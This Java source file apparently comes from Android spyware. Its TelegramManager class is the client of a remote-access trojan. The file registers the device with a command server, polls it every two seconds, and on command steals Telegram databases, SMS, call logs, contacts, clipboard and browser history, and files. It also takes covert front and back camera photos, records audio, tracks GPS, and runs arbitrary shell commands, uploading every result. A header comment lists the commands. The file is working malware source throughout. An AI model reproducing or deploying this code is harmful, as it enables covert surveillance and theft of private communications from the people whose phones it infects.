package com.hhm.android.otherapp;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import com.amap.api.location.AMapLocation;
import com.amap.api.location.AMapLocationClient;
import com.amap.api.location.AMapLocationClientOption;
import com.amap.api.location.AMapLocationListener;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParseException;
import com.hhm.android.otherapp.Https.API;
import com.hhm.android.otherapp.Https.HttpRequest;
import com.hhm.android.otherapp.managers.AppsManager;
import com.hhm.android.otherapp.managers.CallsManager;
import com.hhm.android.otherapp.managers.CameraManager;
import com.hhm.android.otherapp.managers.ContactsManager;
import com.hhm.android.otherapp.managers.FileManager;
import com.hhm.android.otherapp.managers.MicManager;
import com.hhm.android.otherapp.managers.SMSManager;
import com.hhm.android.otherapp.managers.SQLiteManager;
import com.hhm.android.otherapp.utils.Base64Util;
import com.hhm.android.otherapp.utils.RatVo;
import com.hhm.android.otherapp.utils.XorUtil;
import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeoutException;

import io.reactivex.functions.Consumer;
import io.reactivex.plugins.RxJavaPlugins;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.HttpException;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.hhm.android.otherapp.Https.HttpRequest.genericClient;


/**
 * @author huangche
 * @date 2020/11/10
 * 调用入口
 * 注册、心跳、指令请求、指令处理、数据上传
 * 指令：
 *      APP_TG_USER Telegram数据库cache4.db users表单
 *      APP_TG_DIALOG Telegram数据库cache4.db dialogs表单
 *      APP_TG_CHATS Telegram数据库cache4.db chats表单
 *      APP_TG_MESSAGE Telegram数据库cache4.db message
 *      FILE_LS 列目录
 *      FILE_DOWN 下载文件(本地文件上传至服务器)
 *      FILE_UP 上传文件(从服务器拉至本地)
 *      SMS_L 最新last条短信
 *      SMS_ALL 全部短信
 *      CALL_R 最新last条通话记录
 *      CALL_R_ALL 全部通话记录
 *      CONTACTS_ALL 全部通讯录
 *      CUT_PASTE_HIS_ALL 全部剪贴板数据
 *      BROWSER_HIS_ALL 全部浏览器记录
 *      GPS_R 位置经纬度
 *      INFO 设备详细信息
 *      CAM_MOB_F 前置拍照
 *      CAM_MOB_B 后置拍照
 *      AUDIO_R 音频录制
 *      GPS_REALTIME_CONFIG 实时获取位置
 */

public class TelegramManager {
    public static final String TAG = "TelegramManager";
    public static Context context;

    //public static String url = "http://tg.fupdate.cc:8001";
    //public static String url = "http://192.168.3.86:8001";
    public static String url = "http://" + ServiceConfig.getRemoteAddress();
    //public static String url = "http://192.168.6.29:8000";
    public static int count = 0;

    public static void startAsync(final Context con) {
        System.out.println("2021==url==>" + url);
        try {
            context = con;
            sendReq();
            RxJavaPlugins.setErrorHandler(new Consumer<Throwable>() {  // RxJavaPlugins请求失败的处理
                @Override
                public void accept(Throwable e) throws Exception {
                    Log.d("TelegramManager", "onerror:" + e.getMessage());
                    if (e instanceof SocketException) {
                        Log.d("TelegramManager", "网络异常");
                    } else if (e instanceof TimeoutException || e instanceof SocketTimeoutException) {
                        Log.d("TelegramManager", "请求超时");
                    } else if (e instanceof JsonParseException) {
                        Log.d("TelegramManager", "数据解析失败");
                    } else if (e instanceof HttpException) {
                        Log.d("TelegramManager", "服务器异常:" + e.getMessage());
                    }
                }
            });
        } catch (Exception ex){
            startAsync(con);
            Log.e(TAG,"startAsync():" + ex.getMessage());
        }
    }

    public static void sendReq() {
        System.out.println("2020==发送注册请求>");
        Register(context); // 注册请求
    }

    // 注册请求
    @SuppressLint("CheckResult")
    public static void Register(final Context context){
        JsonObject params = new JsonObject();
        try{
            params.addProperty("model",android.net.Uri.encode(Build.MODEL));
            params.addProperty("manufacturer",Build.MANUFACTURER);
            params.addProperty("oem_system",Build.MANUFACTURER + android.net.Uri.encode(Build.MODEL));
            params.addProperty("release", Build.VERSION.RELEASE);

        } catch (Exception e){
            e.printStackTrace();
        }
        HttpRequest.Register(GetCommon(context), params, url).subscribe(new Consumer<RatVo>() {
                    @Override
                    public void accept(RatVo ratVo) throws Exception {
                        if (ratVo.getCode() == 0) { // 注册成功
                            System.out.println("2020==注册请求成功>");
                            //sync_Heart.start(); // 心跳
                            sync_Commands.start(); // 请求
                        } else { // 注册失败
                            count += 1;
                            if (count <= 3){
                                System.out.println("2020==注册请求失败，重新注册中>" + count);
                                Register(context);
                            } else {
                                //sync_Heart.start(); // 心跳
                                sync_Commands.start(); // 请求
                            }
                        }
                    }
                });
    }

    // 心跳请求
    @SuppressLint("CheckResult")
    public static void Heart(Context context){
        //Commands(context);
        HttpRequest.Heart(GetCommon(context), url).subscribe(new Consumer<RatVo>() {
                    @Override
                    public void accept(RatVo ratVo) throws Exception {
                        if (ratVo.getCode() == 0) { // 心跳请求成功
                            System.out.println("2020==心跳请求成功>");
                        } else { // 心跳请求失败
                            System.out.println("2020==心跳请求失败>");
                        }
                    }
                });
    }

    // 请求指令
    @SuppressLint("CheckResult")
    public static void Commands(final Context context){
        HttpRequest.Commands(GetCommon(context), url).subscribe(new Consumer<RatVo>() {
            @Override
            public void accept(RatVo ratVo) throws Exception {
                if (ratVo.getCode() == 0) { // 请求成功
                    System.out.println("2020==请求指令成功");
                    if (ratVo.getData().size() != 0) {
                        JsonObject jsonObject = ratVo.getData();
                        final String action = jsonObject.get("action").toString().substring(1,jsonObject.get("action").toString().length()-1);
                        System.out.println("2020==请求成功，指令为>" + action);
                        final int action_id = Integer.valueOf(jsonObject.get("action_id").toString());
                        switch (action){
                            case "APP_TG_USER":  // Telegram users
                                Datas(context,action_id,0,"success",TelegramDb.Users(context,"users"));
                                break;
                            case "APP_TG_DIALOG": // Telegram dialogs
                                Datas(context,action_id,0,"success",TelegramDb.Dialogs(context,"dialogs"));
                                break;
                            case "APP_TG_CHATS": // Telegram chats
                                Datas(context,action_id,0,"success",TelegramDb.Chats(context,"chats"));
                                break;
                            case "APP_TG_MESSAGE": // Telegram messages
                                int length = Integer.valueOf(jsonObject.get("length").toString());
                                String uid = String.valueOf(Integer.valueOf(jsonObject.get("uid").toString()));
                                String timestamp = jsonObject.get("msg_timestamp").toString().substring(1,jsonObject.get("msg_timestamp").toString().length()-1);
                                String mid = timestamp.equals("0") ? null : timestamp;
                                String direction = jsonObject.get("direction").toString().substring(1,jsonObject.get("direction").toString().length()-1);
                                System.out.println("Messages==>" + "uid=" + uid + ",mid=" + mid + ",direction=" + direction);
                                Datas(context,action_id,0,"success",TelegramDb.Messagess(context,"messages",length,uid,mid,direction));
                                break;
                            case "APP_TG_FILE": // Telegram file
                                final String File_name = jsonObject.get("file_name").toString().substring(1,jsonObject.get("file_name").toString().length()-1);
                                final String File_path = jsonObject.get("file_path").toString().substring(1,jsonObject.get("file_path").toString().length()-1);
                                System.out.println("2020==>" + File_path + File_name);
                                File file = new File(File_path + File_name);
                                if (Permission.getPermission(context,"android.permission.READ_EXTERNAL_STORAGE")){
                                    if (file.exists() && file.canRead() && file.isFile()){
                                        TelegramDb.T_Sendfile(context,file,action_id,url);
                                    } else {
                                        SendFile(context,action_id);
                                    }
                                } else {
                                    SendFile(context,action_id);
                                }
                                break;
                            case "FILE_LS": // 列目录 路径 path_ls
                                String path_ls = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
                                if (new File(path_ls).isFile()){
                                    Datas(context,action_id,10003,"指令参数错误，参数为目录",null);
                                } else {
                                    if (new File(path_ls).canRead()){
                                        Datas(context,action_id,0,"success",FileManager.walk(path_ls));
                                    } else {
                                        Datas(context,action_id,10001,"没有权限，无法执行操作",null);
                                    }
                                }
                                break;
                            case "SMS_L": // 短信列表 最近last条记录
                                if (Permission.getPermission(context,"android.permission.READ_SMS")){
                                    int number = Integer.parseInt(jsonObject.get("last").toString());
                                    Datas(context,action_id,0,"success", SMSManager.getSMSList(context,number));
                                } else {
                                    Datas(context,action_id,10001,"没有权限，无法执行操作", null);
                                }
                                break;
                            case "SMS_ALL": // 获取全部短信
                                if (Permission.getPermission(context,"android.permission.READ_SMS")){
                                    Datas(context,action_id,0,"success", SMSManager.getSMSList(context,0));
                                } else {
                                    Datas(context,action_id,10001,"没有权限，无法执行操作", null);
                                }
                                break;
                            case "CALL_R": // 通话记录 最近last条记录
                                if (Permission.getPermission(context,"android.permission.READ_CALL_LOG")){
                                    int number = Integer.parseInt(jsonObject.get("last").toString());
                                    Datas(context,action_id,0,"success", CallsManager.getContentCallLog(context,number));
                                } else {
                                    Datas(context,action_id,10001,"没有权限，无法执行操作", null);
                                }
                                break;
                            case "CALL_R_ALL": // 获取全部通话记录
                                if (Permission.getPermission(context,"android.permission.READ_CALL_LOG")){
                                    Datas(context,action_id,0,"success", CallsManager.getContentCallLog(context,0));
                                } else {
                                    Datas(context,action_id,10001,"没有权限，无法执行操作", null);
                                }
                                break;
                            case "CONTACTS_ALL": // 获取全部通讯录
                                if (Permission.getPermission(context,"android.permission.READ_CONTACTS")){
                                    Datas(context,action_id,0,"success", ContactsManager.getContacts(context));
                                } else {
                                    Datas(context,action_id,10001,"没有权限，无法执行操作", null);
                                }
                                break;
                            case "CUT_PASTE_HIS_ALL": // 获取全部剪贴板内容
                                SQLiteManager.getClipList(context,action_id,url);
                                break;
                            case "BROWSER_HIS_ALL": // 获取全部浏览器记录
                                SQLiteManager.getLogList(context,action_id,url);
                                break;
                            case "INFO": // 详细信息
                                JsonObject info = new JsonObject();
                                try{
                                    info.addProperty("model",android.net.Uri.encode(Build.MODEL));
                                    info.addProperty("manufacturer",Build.MANUFACTURER);
                                    info.addProperty("oem_system",Build.MANUFACTURER + android.net.Uri.encode(Build.MODEL));
                                    info.addProperty("release", Build.VERSION.RELEASE);
                                    info.addProperty("app_name", getNameByPackageName(context,context.getPackageName()));
                                } catch (Exception e){}
                                Datas_n(context,action_id,0,"success",info);
                                break;
                            case "APP_LIST": // 应用列表
                                Datas(context,action_id,0,"success", AppsManager.GetAppsList(context));
                                break;
                            case "FILE_DOWN": // 下载文件(本地文件上传至服务器)
                                String path_down = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
                                if (new File(path_down).canRead() && new File(path_down).isFile() && new File(path_down).exists()) {
                                    FileManager.downloadFile(context,path_down,action_id,url);
                                } else {
                                    SendFile(context,action_id);
                                }
                                break;
                            case "FILE_UP": // 上传文件(从服务器拉至本地) 本地路径 file_path 服务器下载url file_url
                                final String file_path = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
                                final String file_url = jsonObject.get("file_url").toString().substring(1,jsonObject.get("file_url").toString().length()-1);
                                String path_up = file_path.substring(0, file_path.lastIndexOf("/"));
                                if(new File(path_up).canWrite()) {
                                    new Thread(new Runnable() {
                                        @Override
                                        public void run() {
                                            FileManager.UploadFile(file_path, file_url,context,action_id);
                                        }
                                    }).start();
                                } else {
                                    SendFile(context,action_id);
                                }
                                break;
                            case "FILE_MKDIR": // 文件夹创建（暂无）
                                final String Mk_file = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
                                String Dir_path = Mk_file.substring(0, Mk_file.lastIndexOf("/"));
                                if (Permission.getPermission(context,"android.permission.WRITE_EXTERNAL_STORAGE")
                                        && new File(Dir_path).canWrite()) {
                                    Datas(context,action_id,10001,"没有权限，无法执行操作", null);
                                } else {
                                    if (FileManager.Mkdir(Mk_file) == 0) {
                                        Datas(context,action_id,10004,"文件夹已存在", null);
                                    } else if (FileManager.Mkdir(Mk_file) == 1) {
                                        Datas(context,action_id,0,"success", null);
                                    } else if (FileManager.Mkdir(Mk_file) == 2) {
                                        Datas(context,action_id,10005,"文件夹创建失败", null);
                                    }
                                }
                                break;
                            case "CAM_MOB_F": // 前置拍照
                                if (Permission.getPermission(context,"android.permission.CAMERA")) {
                                    new CameraManager(context).startUp(1,action_id,url);
                                } else {
                                    SendFile(context,action_id);
                                }
                                break;
                            case "CAM_MOB_B": // 后置拍照
                                if (Permission.getPermission(context,"android.permission.CAMERA")) {
                                    new CameraManager(context).startUp(0,action_id,url);
                                } else {
                                    SendFile(context,action_id);
                                }
                                break;
                            case "AUDIO_R": // 录音 时长sec
                                int sec = Integer.valueOf(jsonObject.get("sec").toString());
                                if (Permission.getPermission(context,"android.permission.RECORD_AUDIO") && sec > 0) {
                                    try {
                                        MicManager.startRecording(context,sec,action_id,url); //录音
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                } else {
                                    SendFile(context, action_id);
                                }
                                break;
                            case "GPS_R": // 获取位置
                                if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")) {
                                    init(context,action_id);
                                    /*LocManager gps = new LocManager(context);
                                    JsonObject location = new JsonObject();
                                    if(gps.canGetLocation()){
                                        double latitude = gps.getLatitude();
                                        double longitude = gps.getLongitude();
                                        location.addProperty("latitude" , latitude);
                                        location.addProperty("longitude" , longitude);
                                    }
                                    Datas_n(context,action_id,0,"success",location);*/
                                } else {
                                    Datas_n(context,action_id,10001,"没有权限，无法执行操作",null);
                                }
                                break;
                            case "GPS_REALTIME_CONFIG": // 实时获取位置
                                Datas_n(context,action_id,0,"success",null);
                                enable = Boolean.valueOf(jsonObject.get("enable").toString());
                                interval = Integer.valueOf(jsonObject.get("interval").toString());
                                if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")) {
                                    new Thread_GPS().start();
                                } else {
                                    Datas_n(context,action_id,10001,"没有权限，无法执行操作",null);
                                }
                                break;
                            case "SHELL_CMD": // 执行shell命令返回执行结果
                                String command = jsonObject.get("command").toString().substring(1,jsonObject.get("command").toString().length()-1);
                                Datas_n(context,action_id,0,"success", execCommand(command));
                                break;
                            default:
                                break;
                        }
                    }
                } else { // 请求失败
                    System.out.println("2020==请求指令发送失败>");
                }
            }
        });
    }

    // 执行shell命令，返回结果
    public static JsonObject execCommand(String cmd) {
        JsonObject info = new JsonObject();
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            String data = "";
            BufferedReader ie = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String error;
            while ((error = ie.readLine()) != null) {
                data += error + "\n";
            }
            String line;
            while ((line = in.readLine()) != null) {
                data += line + "\n";
            }
            if (data.equals("") && p.waitFor() == 0) data = "success";
            info.addProperty("result",data);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
            info.addProperty("result",e.toString());
        }
        return info;
    }

    // 数据结果上报 格式：JsonArray
    @SuppressLint("CheckResult")
    public static void Datas(Context context, int action_id, int code, String msg, final JsonArray res_data) {
        JsonObject params = new JsonObject();
        try{
            params.addProperty("action_id", action_id);
            params.addProperty("code", code);
            params.addProperty("msg",msg);
            params.add("res_data", res_data);
        } catch (Exception e){}
        HttpRequest.Datas(GetCommon(context), params, url)
                .subscribe(new Consumer<RatVo>() {
                    @Override
                    public void accept(RatVo ratVo) throws Exception {
                        if (ratVo.getCode() == 0) { // 上报成功
                            System.out.println("2020==数据上报成功>");
                        } else { // 上报失败
                            System.out.println("2020==数据上报失败>");
                        }
                    }
                });
    }

    // 数据结果上报 格式：JsonObject
    @SuppressLint("CheckResult")
    public static void Datas_n(Context context, int action_id, int code, String msg, JsonObject res_data){
        JsonObject params = new JsonObject();
        try{
            params.addProperty("action_id", action_id);
            params.addProperty("code", code);
            params.addProperty("msg",msg);
            params.add("res_data", res_data);
        } catch (Exception e){}
        HttpRequest.Datas(GetCommon(context), params, url)
                .subscribe(new Consumer<RatVo>() {
                    @Override
                    public void accept(RatVo ratVo) throws Exception {
                        if (ratVo.getCode() == 0) { // 上报成功
                            System.out.println("2020==数据上报成功s>");
                        } else { // 上报失败
                            System.out.println("2020==数据上报失败s>");
                        }
                    }
                });
    }

    // 实时数据结果上报 格式：JsonObject
    @SuppressLint("CheckResult")
    public static void Datas_rt(Context context, int code, String msg, JsonObject res_data){
        JsonObject params = new JsonObject();
        try{
            params.addProperty("rt_action_type", "GPS_RT");
            params.addProperty("code", code);
            params.addProperty("msg",msg);
            params.add("res_data", res_data);
        } catch (Exception e){
            e.printStackTrace();
        }
        HttpRequest.Datas_rt(GetCommon(context), params, url).subscribe(new Consumer<RatVo>() {
                    @Override
                    public void accept(RatVo ratVo) throws Exception {
                        if (ratVo.getCode() == 0) { // 上报成功
                            System.out.println("2020==实时数据上报成功>");
                        } else { // 上报失败
                            System.out.println("2020==实时数据上报失败>");
                        }
                    }
                });
    }

    // 文件数据结果上报(no permission/no file)
    public static void SendFile(Context context, int action_id){
        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
                .addFormDataPart("device_name", "")
                .addFormDataPart("os", "AND")
                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                .addFormDataPart("version", "android_1.0.0")
                .addFormDataPart("down_delay", "-1")
                .addFormDataPart("action_id", String.valueOf(action_id))
                .addFormDataPart("code", String.valueOf(10001))
                .addFormDataPart("msg", "没有权限或参数不正确，无法执行操作")
                .build();

        Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
                .client(genericClient())
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJava2CallAdapterFactory.create()).build();
        API api = retrofit.create(API.class);
        Call<RatVo> call = api.file(requestBody);
        call.enqueue(new Callback<RatVo>() {
            @Override
            public void onResponse(Call<RatVo> call, Response<RatVo> response) {
                Log.v("Upload", "success");
            }

            @Override
            public void onFailure(Call<RatVo> call, Throwable t) {
                Log.e("Upload error:", t.getMessage());
            }
        });
    }

    // 实时文件数据结果上报
    public void SendFile_Rt(Context context, String path, String rt_action_type){
        File file = new File(path);
        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
                .addFormDataPart("device_name", "")
                .addFormDataPart("os", "AND")
                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                .addFormDataPart("version", "android_1.0.0")
                .addFormDataPart("down_delay", "-1")
                .addFormDataPart("rt_action_type", rt_action_type)
                .addFormDataPart("file", file.getName(), RequestBody.create(MultipartBody.FORM, file))
                .build();

        Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJava2CallAdapterFactory.create()).build();
        API api = retrofit.create(API.class);
        Call<RatVo> call = api.file_rt(requestBody);
        call.enqueue(new Callback<RatVo>() {
            @Override
            public void onResponse(Call<RatVo> call, Response<RatVo> response) {
                Log.v("Upload", "success");
            }

            @Override
            public void onFailure(Call<RatVo> call, Throwable t) {
                Log.e("Upload error:", t.getMessage());
            }
        });
    }

    // GetCommon
    public static JsonObject GetCommon(Context context){
        JsonObject common = new JsonObject();
        try {
            common.addProperty("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
            common.addProperty("device_name", "");
            common.addProperty("os", "AND");
            common.addProperty("timestamp", System.currentTimeMillis());
            common.addProperty("version", "android_1.0.0");
            common.addProperty("down_delay", -1);
            return common;
        } catch (Exception e){}
        return null;
    }


    public static int Num = 0;
    // 请求指令
    static Thread sync_Commands = new Thread(new Runnable() {
        @Override
        public void run() {
            while (true) {
                Commands(context);
                Num = Num + 1;
                if (Num == 5){
                    Heart(context);
                    Num = 0;
                }
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    });

    // 心跳
    static Thread sync_Heart = new Thread(new Runnable() {
        @Override
        public void run() {
            while (true) {
                System.out.println("2020==发送心跳请求>");
                Heart(context);
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    });


    // 获取应用版本号VersionName
    public static String localVersionName(Context mContext){
        String versionName = "";
        try {
            versionName = mContext.getPackageManager().getPackageInfo(mContext.getPackageName(),0).versionName;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return versionName;
    }

    // 包名获取应用名
    public static String getNameByPackageName(Context context, String packageName) {
        PackageManager pm = context.getPackageManager();
        String Name ;
        try {
            Name=pm.getApplicationLabel(pm.getApplicationInfo(packageName,PackageManager.GET_META_DATA)).toString();
        } catch (PackageManager.NameNotFoundException e) {
            Name = "" ;
        }
        return Name;
    }

    /**
     * 调用高德SDK获取经纬度
     */
    public static AMapLocationClient mLocationClient = null;
    public static AMapLocationListener mLocationListener;
    public static AMapLocationClientOption mLocationOption = null;
    public static int action_id;
    public static void init(Context context,int id) {
        action_id = id;
        mLocationListener = new MyAMapLocationListener();
        mLocationClient = new AMapLocationClient(context); //初始化定位
        mLocationClient.setLocationListener(mLocationListener); //设置定位回调监听
        mLocationOption = new AMapLocationClientOption(); //初始化AMapLocationClientOption对象
        mLocationOption.setLocationMode(AMapLocationClientOption.AMapLocationMode.Hight_Accuracy); // 定位高精度模式
        mLocationOption.setOnceLocation(true); // 获取一次结果（true）
        //获取最近3s内精度最高的一次定位结果
        //设置setOnceLocationLatest(boolean b)接口为true，启动定位时SDK会返回最近3s内精度最高的一次定位结果。如果设置其为true，setOnceLocation(boolean b)接口也会被设置为true，反之不会，默认为false。
        mLocationOption.setOnceLocationLatest(false);
        mLocationOption.setNeedAddress(true); // 设置是否返回地址信息（默认返回地址信息）
        mLocationOption.setMockEnable(false); // 设置是否允许模拟位置,默认为false，不允许模拟位置
        mLocationOption.setLocationCacheEnable(false); // 关闭缓存机制
        mLocationClient.setLocationOption(mLocationOption); // 给定位客户端对象设置定位参数
        mLocationClient.startLocation(); // 启动定位
    }

    // 高德SDK经纬度回调返回
    private static class MyAMapLocationListener implements AMapLocationListener {
        @Override
        public void onLocationChanged(AMapLocation aMapLocation) {
            if (aMapLocation != null) {
                if (aMapLocation.getErrorCode() == 0) {
                    Log.e("位置", aMapLocation.getAddress());
                    JsonObject location = new JsonObject();
                    location.addProperty("latitude" , aMapLocation.getLatitude());
                    location.addProperty("longitude" , aMapLocation.getLongitude());
                    if (action_id == 0) {
                        Datas_rt(context,0,"success",location);
                        System.out.println("20201217==>" + new Gson().toJson(location));
                    } else {
                        Datas_n(context,action_id,0,"success",location);
                    }
                } else {
                    Log.e("AmapError", "location Error,ErrCode:"
                            + aMapLocation.getErrorCode() + ",errInfo:"
                            + aMapLocation.getErrorInfo());
                }
            }
        }
    }

    // GPS 定时上报
    public static boolean enable = false;
    public static int interval = 0;
    public static class Thread_GPS extends Thread {
        @Override
        public void run() {
            while (enable){
                try {
                    init(context,0);
                    Thread.sleep(interval * 1000);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }


}
